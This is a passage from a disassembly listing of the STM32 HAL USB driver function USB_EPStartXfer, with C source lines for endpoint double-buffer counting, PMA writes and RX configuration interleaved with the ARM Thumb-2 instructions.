 80074ea:	2b00      	cmp	r3, #0
 80074ec:	d10a      	bne.n	8007504 <USB_EPStartXfer+0xade>
 80074ee:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074f0:	881b      	ldrh	r3, [r3, #0]
 80074f2:	b29b      	uxth	r3, r3
 80074f4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80074f8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80074fc:	b29a      	uxth	r2, r3
 80074fe:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007500:	801a      	strh	r2, [r3, #0]
 8007502:	e041      	b.n	8007588 <USB_EPStartXfer+0xb62>
 8007504:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007508:	085b      	lsrs	r3, r3, #1
 800750a:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 800750e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007512:	f003 0301 	and.w	r3, r3, #1
 8007516:	2b00      	cmp	r3, #0
 8007518:	d004      	beq.n	8007524 <USB_EPStartXfer+0xafe>
 800751a:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 800751e:	3301      	adds	r3, #1
 8007520:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007524:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007526:	881b      	ldrh	r3, [r3, #0]
 8007528:	b29a      	uxth	r2, r3
 800752a:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 800752e:	b29b      	uxth	r3, r3
 8007530:	029b      	lsls	r3, r3, #10
 8007532:	b29b      	uxth	r3, r3
 8007534:	4313      	orrs	r3, r2
 8007536:	b29a      	uxth	r2, r3
 8007538:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800753a:	801a      	strh	r2, [r3, #0]
 800753c:	e024      	b.n	8007588 <USB_EPStartXfer+0xb62>
 800753e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007542:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007546:	681b      	ldr	r3, [r3, #0]
 8007548:	785b      	ldrb	r3, [r3, #1]
 800754a:	2b01      	cmp	r3, #1
 800754c:	d11c      	bne.n	8007588 <USB_EPStartXfer+0xb62>
 800754e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007552:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007556:	681b      	ldr	r3, [r3, #0]
 8007558:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800755c:	b29b      	uxth	r3, r3
 800755e:	461a      	mov	r2, r3
 8007560:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 8007562:	4413      	add	r3, r2
 8007564:	673b      	str	r3, [r7, #112]	; 0x70
 8007566:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800756a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800756e:	681b      	ldr	r3, [r3, #0]
 8007570:	781b      	ldrb	r3, [r3, #0]
 8007572:	00da      	lsls	r2, r3, #3
 8007574:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 8007576:	4413      	add	r3, r2
 8007578:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800757c:	66fb      	str	r3, [r7, #108]	; 0x6c
 800757e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007582:	b29a      	uxth	r2, r3
 8007584:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 8007586:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr1;
 8007588:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800758c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007590:	681b      	ldr	r3, [r3, #0]
 8007592:	895b      	ldrh	r3, [r3, #10]
 8007594:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007598:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800759c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075a0:	681b      	ldr	r3, [r3, #0]
 80075a2:	6959      	ldr	r1, [r3, #20]
 80075a4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80075a8:	b29b      	uxth	r3, r3
 80075aa:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80075ae:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80075b2:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80075b6:	6800      	ldr	r0, [r0, #0]
 80075b8:	f000 ff41 	bl	800843e <USB_WritePMA>
 80075bc:	e0ca      	b.n	8007754 <USB_EPStartXfer+0xd2e>
        }
        else
        {
          /* Set the Double buffer counter for pmabuffer0 */
          PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 80075be:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075c2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075c6:	681b      	ldr	r3, [r3, #0]
 80075c8:	785b      	ldrb	r3, [r3, #1]
 80075ca:	2b00      	cmp	r3, #0
 80075cc:	d177      	bne.n	80076be <USB_EPStartXfer+0xc98>
 80075ce:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075d2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80075d6:	681b      	ldr	r3, [r3, #0]
 80075d8:	67fb      	str	r3, [r7, #124]	; 0x7c
 80075da:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075de:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80075e2:	681b      	ldr	r3, [r3, #0]
 80075e4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80075e8:	b29b      	uxth	r3, r3
 80075ea:	461a      	mov	r2, r3
 80075ec:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 80075ee:	4413      	add	r3, r2
 80075f0:	67fb      	str	r3, [r7, #124]	; 0x7c
 80075f2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075f6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075fa:	681b      	ldr	r3, [r3, #0]
 80075fc:	781b      	ldrb	r3, [r3, #0]
 80075fe:	00da      	lsls	r2, r3, #3
 8007600:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 8007602:	4413      	add	r3, r2
 8007604:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007608:	67bb      	str	r3, [r7, #120]	; 0x78
 800760a:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800760c:	881b      	ldrh	r3, [r3, #0]
 800760e:	b29b      	uxth	r3, r3
 8007610:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007614:	b29a      	uxth	r2, r3
 8007616:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007618:	801a      	strh	r2, [r3, #0]
 800761a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800761e:	2b3e      	cmp	r3, #62	; 0x3e
 8007620:	d921      	bls.n	8007666 <USB_EPStartXfer+0xc40>
 8007622:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007626:	095b      	lsrs	r3, r3, #5
 8007628:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 800762c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007630:	f003 031f 	and.w	r3, r3, #31
 8007634:	2b00      	cmp	r3, #0
 8007636:	d104      	bne.n	8007642 <USB_EPStartXfer+0xc1c>
 8007638:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 800763c:	3b01      	subs	r3, #1
 800763e:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007642:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007644:	881b      	ldrh	r3, [r3, #0]
 8007646:	b29a      	uxth	r2, r3
 8007648:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 800764c:	b29b      	uxth	r3, r3
 800764e:	029b      	lsls	r3, r3, #10
 8007650:	b29b      	uxth	r3, r3
 8007652:	4313      	orrs	r3, r2
 8007654:	b29b      	uxth	r3, r3
 8007656:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800765a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800765e:	b29a      	uxth	r2, r3
 8007660:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007662:	801a      	strh	r2, [r3, #0]
 8007664:	e05c      	b.n	8007720 <USB_EPStartXfer+0xcfa>
 8007666:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800766a:	2b00      	cmp	r3, #0
 800766c:	d10a      	bne.n	8007684 <USB_EPStartXfer+0xc5e>
 800766e:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007670:	881b      	ldrh	r3, [r3, #0]
 8007672:	b29b      	uxth	r3, r3
 8007674:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007678:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800767c:	b29a      	uxth	r2, r3
 800767e:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007680:	801a      	strh	r2, [r3, #0]
 8007682:	e04d      	b.n	8007720 <USB_EPStartXfer+0xcfa>
 8007684:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007688:	085b      	lsrs	r3, r3, #1
 800768a:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 800768e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007692:	f003 0301 	and.w	r3, r3, #1
 8007696:	2b00      	cmp	r3, #0
 8007698:	d004      	beq.n	80076a4 <USB_EPStartXfer+0xc7e>
 800769a:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 800769e:	3301      	adds	r3, #1
 80076a0:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 80076a4:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80076a6:	881b      	ldrh	r3, [r3, #0]
 80076a8:	b29a      	uxth	r2, r3
 80076aa:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 80076ae:	b29b      	uxth	r3, r3
 80076b0:	029b      	lsls	r3, r3, #10
 80076b2:	b29b      	uxth	r3, r3
 80076b4:	4313      	orrs	r3, r2
 80076b6:	b29a      	uxth	r2, r3
 80076b8:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80076ba:	801a      	strh	r2, [r3, #0]
 80076bc:	e030      	b.n	8007720 <USB_EPStartXfer+0xcfa>
 80076be:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076c2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80076c6:	681b      	ldr	r3, [r3, #0]
 80076c8:	785b      	ldrb	r3, [r3, #1]
 80076ca:	2b01      	cmp	r3, #1
 80076cc:	d128      	bne.n	8007720 <USB_EPStartXfer+0xcfa>
 80076ce:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076d2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80076d6:	681b      	ldr	r3, [r3, #0]
 80076d8:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 80076dc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076e0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80076e4:	681b      	ldr	r3, [r3, #0]
 80076e6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80076ea:	b29b      	uxth	r3, r3
 80076ec:	461a      	mov	r2, r3
 80076ee:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 80076f2:	4413      	add	r3, r2
 80076f4:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 80076f8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076fc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007700:	681b      	ldr	r3, [r3, #0]
 8007702:	781b      	ldrb	r3, [r3, #0]
 8007704:	00da      	lsls	r2, r3, #3
 8007706:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 800770a:	4413      	add	r3, r2
 800770c:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007710:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 8007714:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007718:	b29a      	uxth	r2, r3
 800771a:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 800771e:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 8007720:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007724:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007728:	681b      	ldr	r3, [r3, #0]
 800772a:	891b      	ldrh	r3, [r3, #8]
 800772c:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007730:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007734:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007738:	681b      	ldr	r3, [r3, #0]
 800773a:	6959      	ldr	r1, [r3, #20]
 800773c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007740:	b29b      	uxth	r3, r3
 8007742:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007746:	f507 7084 	add.w	r0, r7, #264	; 0x108
 800774a:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 800774e:	6800      	ldr	r0, [r0, #0]
 8007750:	f000 fe75 	bl	800843e <USB_WritePMA>
        }
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_VALID);
 8007754:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007758:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800775c:	681a      	ldr	r2, [r3, #0]
 800775e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007762:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007766:	681b      	ldr	r3, [r3, #0]
 8007768:	781b      	ldrb	r3, [r3, #0]
 800776a:	009b      	lsls	r3, r3, #2
 800776c:	4413      	add	r3, r2
 800776e:	881b      	ldrh	r3, [r3, #0]
 8007770:	b29b      	uxth	r3, r3
 8007772:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8007776:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800777a:	817b      	strh	r3, [r7, #10]
 800777c:	897b      	ldrh	r3, [r7, #10]
 800777e:	f083 0310 	eor.w	r3, r3, #16
 8007782:	817b      	strh	r3, [r7, #10]
 8007784:	897b      	ldrh	r3, [r7, #10]
 8007786:	f083 0320 	eor.w	r3, r3, #32
 800778a:	817b      	strh	r3, [r7, #10]
 800778c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007790:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007794:	681a      	ldr	r2, [r3, #0]
 8007796:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800779a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800779e:	681b      	ldr	r3, [r3, #0]
 80077a0:	781b      	ldrb	r3, [r3, #0]
 80077a2:	009b      	lsls	r3, r3, #2
 80077a4:	441a      	add	r2, r3
 80077a6:	897b      	ldrh	r3, [r7, #10]
 80077a8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80077ac:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80077b0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80077b4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80077b8:	b29b      	uxth	r3, r3
 80077ba:	8013      	strh	r3, [r2, #0]
 80077bc:	f000 bcde 	b.w	800817c <USB_EPStartXfer+0x1756>
  }
  else /* OUT endpoint */
  {
    if (ep->doublebuffer == 0U)
 80077c0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077c4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077c8:	681b      	ldr	r3, [r3, #0]
 80077ca:	7b1b      	ldrb	r3, [r3, #12]
 80077cc:	2b00      	cmp	r3, #0
 80077ce:	f040 80bb 	bne.w	8007948 <USB_EPStartXfer+0xf22>
    {
      /* Multi packet transfer */
      if (ep->xfer_len > ep->maxpacket)
 80077d2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077d6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077da:	681b      	ldr	r3, [r3, #0]
 80077dc:	699a      	ldr	r2, [r3, #24]
 80077de:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077e2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077e6:	681b      	ldr	r3, [r3, #0]
 80077e8:	691b      	ldr	r3, [r3, #16]
 80077ea:	429a      	cmp	r2, r3
 80077ec:	d917      	bls.n	800781e <USB_EPStartXfer+0xdf8>
      {
        len = ep->maxpacket;
 80077ee:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077f2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077f6:	681b      	ldr	r3, [r3, #0]
 80077f8:	691b      	ldr	r3, [r3, #16]
 80077fa:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len -= len;
 80077fe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007802:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007806:	681b      	ldr	r3, [r3, #0]
 8007808:	699a      	ldr	r2, [r3, #24]
 800780a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800780e:	1ad2      	subs	r2, r2, r3
 8007810:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007814:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007818:	681b      	ldr	r3, [r3, #0]
 800781a:	619a      	str	r2, [r3, #24]
 800781c:	e00e      	b.n	800783c <USB_EPStartXfer+0xe16>
      }
      else
      {
        len = ep->xfer_len;
 800781e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007822:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007826:	681b      	ldr	r3, [r3, #0]
 8007828:	699b      	ldr	r3, [r3, #24]
 800782a:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len = 0U;
 800782e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007832:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007836:	681b      	ldr	r3, [r3, #0]
 8007838:	2200      	movs	r2, #0
 800783a:	619a      	str	r2, [r3, #24]
      }
      /* configure and validate Rx endpoint */
      PCD_SET_EP_RX_CNT(USBx, ep->num, len);
 800783c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007840:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007844:	681b      	ldr	r3, [r3, #0]
 8007846:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 800784a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800784e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007852:	681b      	ldr	r3, [r3, #0]
 8007854:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007858:	b29b      	uxth	r3, r3
 800785a:	461a      	mov	r2, r3
 800785c:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 8007860:	4413      	add	r3, r2
 8007862:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 8007866:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800786a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800786e:	681b      	ldr	r3, [r3, #0]
 8007870:	781b      	ldrb	r3, [r3, #0]
 8007872:	00da      	lsls	r2, r3, #3
 8007874:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 8007878:	4413      	add	r3, r2
 800787a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800787e:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
 8007882:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007886:	881b      	ldrh	r3, [r3, #0]
 8007888:	b29b      	uxth	r3, r3
 800788a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800788e:	b29a      	uxth	r2, r3
 8007890:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007894:	801a      	strh	r2, [r3, #0]
 8007896:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800789a:	2b3e      	cmp	r3, #62	; 0x3e
 800789c:	d924      	bls.n	80078e8 <USB_EPStartXfer+0xec2>
 800789e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078a2:	095b      	lsrs	r3, r3, #5
 80078a4:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 80078a8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078ac:	f003 031f 	and.w	r3, r3, #31
 80078b0:	2b00      	cmp	r3, #0
 80078b2:	d104      	bne.n	80078be <USB_EPStartXfer+0xe98>
 80078b4:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 80078b8:	3b01      	subs	r3, #1
 80078ba:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 80078be:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078c2:	881b      	ldrh	r3, [r3, #0]
 80078c4:	b29a      	uxth	r2, r3
 80078c6:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 80078ca:	b29b      	uxth	r3, r3
 80078cc:	029b      	lsls	r3, r3, #10
 80078ce:	b29b      	uxth	r3, r3
 80078d0:	4313      	orrs	r3, r2
 80078d2:	b29b      	uxth	r3, r3
 80078d4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80078d8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80078dc:	b29a      	uxth	r2, r3
 80078de:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078e2:	801a      	strh	r2, [r3, #0]
 80078e4:	f000 bc10 	b.w	8008108 <USB_EPStartXfer+0x16e2>
 80078e8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078ec:	2b00      	cmp	r3, #0
 80078ee:	d10c      	bne.n	800790a <USB_EPStartXfer+0xee4>
 80078f0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078f4:	881b      	ldrh	r3, [r3, #0]
 80078f6:	b29b      	uxth	r3, r3
 80078f8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80078fc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007900:	b29a      	uxth	r2, r3
 8007902:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007906:	801a      	strh	r2, [r3, #0]
 8007908:	e3fe      	b.n	8008108 <USB_EPStartXfer+0x16e2>
 800790a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800790e:	085b      	lsrs	r3, r3, #1
 8007910:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007914:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007918:	f003 0301 	and.w	r3, r3, #1
 800791c:	2b00      	cmp	r3, #0
 800791e:	d004      	beq.n	800792a <USB_EPStartXfer+0xf04>
 8007920:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007924:	3301      	adds	r3, #1
 8007926:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 800792a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800792e:	881b      	ldrh	r3, [r3, #0]
 8007930:	b29a      	uxth	r2, r3
 8007932:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007936:	b29b      	uxth	r3, r3
 8007938:	029b      	lsls	r3, r3, #10
 800793a:	b29b      	uxth	r3, r3
 800793c:	4313      	orrs	r3, r2
 800793e:	b29a      	uxth	r2, r3
 8007940:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007944:	801a      	strh	r2, [r3, #0]
 8007946:	e3df      	b.n	8008108 <USB_EPStartXfer+0x16e2>
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* First Transfer Coming From HAL_PCD_EP_Receive & From ISR */
      /* Set the Double buffer counter */
      if (ep->type == EP_TYPE_BULK)
 8007948:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800794c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007950:	681b      	ldr	r3, [r3, #0]
 8007952:	78db      	ldrb	r3, [r3, #3]
 8007954:	2b02      	cmp	r3, #2
 8007956:	f040 8218 	bne.w	8007d8a <USB_EPStartXfer+0x1364>
      {
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, ep->maxpacket);
 800795a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800795e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007962:	681b      	ldr	r3, [r3, #0]
 8007964:	785b      	ldrb	r3, [r3, #1]
 8007966:	2b00      	cmp	r3, #0
 8007968:	f040 809d 	bne.w	8007aa6 <USB_EPStartXfer+0x1080>
 800796c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007970:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007974:	681b      	ldr	r3, [r3, #0]
 8007976:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 800797a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800797e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007982:	681b      	ldr	r3, [r3, #0]
 8007984:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007988:	b29b      	uxth	r3, r3
 800798a:	461a      	mov	r2, r3
 800798c:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 8007990:	4413      	add	r3, r2
 8007992:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 8007996:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800799a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800799e:	681b      	ldr	r3, [r3, #0]
 80079a0:	781b      	ldrb	r3, [r3, #0]
 80079a2:	00da      	lsls	r2, r3, #3
 80079a4:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 80079a8:	4413      	add	r3, r2
 80079aa:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80079ae:	f8c7 30a8 	str.w	r3, [r7, #168]	; 0xa8
 80079b2:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 80079b6:	881b      	ldrh	r3, [r3, #0]
 80079b8:	b29b      	uxth	r3, r3
 80079ba:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80079be:	b29a      	uxth	r2, r3
 80079c0:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 80079c4:	801a      	strh	r2, [r3, #0]
 80079c6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079ca:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079ce:	681b      	ldr	r3, [r3, #0]
 80079d0:	691b      	ldr	r3, [r3, #16]
 80079d2:	2b3e      	cmp	r3, #62	; 0x3e
 80079d4:	d92b      	bls.n	8007a2e <USB_EPStartXfer+0x1008>
 80079d6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079da:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079de:	681b      	ldr	r3, [r3, #0]
 80079e0:	691b      	ldr	r3, [r3, #16]
 80079e2:	095b      	lsrs	r3, r3, #5
 80079e4:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 80079e8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079ec:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079f0:	681b      	ldr	r3, [r3, #0]
 80079f2:	691b      	ldr	r3, [r3, #16]
 80079f4:	f003 031f 	and.w	r3, r3, #31
 80079f8:	2b00      	cmp	r3, #0
 80079fa:	d104      	bne.n	8007a06 <USB_EPStartXfer+0xfe0>
 80079fc:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007a00:	3b01      	subs	r3, #1
 8007a02:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007a06:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a0a:	881b      	ldrh	r3, [r3, #0]
 8007a0c:	b29a      	uxth	r2, r3
 8007a0e:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007a12:	b29b      	uxth	r3, r3
 8007a14:	029b      	lsls	r3, r3, #10
 8007a16:	b29b      	uxth	r3, r3
 8007a18:	4313      	orrs	r3, r2
 8007a1a:	b29b      	uxth	r3, r3
 8007a1c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007a20:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007a24:	b29a      	uxth	r2, r3
 8007a26:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a2a:	801a      	strh	r2, [r3, #0]
 8007a2c:	e070      	b.n	8007b10 <USB_EPStartXfer+0x10ea>
 8007a2e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a32:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a36:	681b      	ldr	r3, [r3, #0]
 8007a38:	691b      	ldr	r3, [r3, #16]
 8007a3a:	2b00      	cmp	r3, #0
 8007a3c:	d10c      	bne.n	8007a58 <USB_EPStartXfer+0x1032>
 8007a3e:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a42:	881b      	ldrh	r3, [r3, #0]
